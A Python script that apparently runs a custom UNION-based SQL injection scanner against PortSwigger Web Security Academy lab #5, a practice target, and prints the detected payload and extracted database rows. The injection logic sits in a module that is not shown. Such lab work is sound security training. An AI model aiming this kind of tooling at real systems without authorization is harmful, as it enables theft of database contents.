"""
PortSwigger Lab #5: Listing database contents on non-Oracle databases
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.modules.scanner.modules.union_sqli import UnionSQLiScanner

# ============================================================
# Configuration
# ============================================================

TARGET = "https://0a5400250461199f80c7f8d600b600fe.web-security-academy.net/filter?category=Pets"

# ============================================================
# Run Test
# ============================================================


def main():
    print("=" * 60)
    print("PortSwigger Lab #5: Listing Database Contents")
    print("=" * 60)

    scanner = UnionSQLiScanner(TARGET)
    scanner.parameter = "category"
    findings = scanner.scan()

    print(f"\n{'='*60}")
    print("RESULTS")
    print(f"{'='*60}")
    print(f"Findings: {len(findings)}")

    for f in findings:
        print(f"\n  ✅ Vulnerability Found!")
        print(f"  DBMS: {f.dbms}")
        print(f"  Column Count: {f.column_count}")
        print(f"  Payload: {f.payload}")
        print(f"  Confidence: {f.confidence * 100:.0f}%")
        print(f"  Extracted Data: {len(f.extracted_data)} rows")

        for row in f.extracted_data:
            for key, value in row.items():
                print(f"    {key}: {value}")


if __name__ == "__main__":
    main()
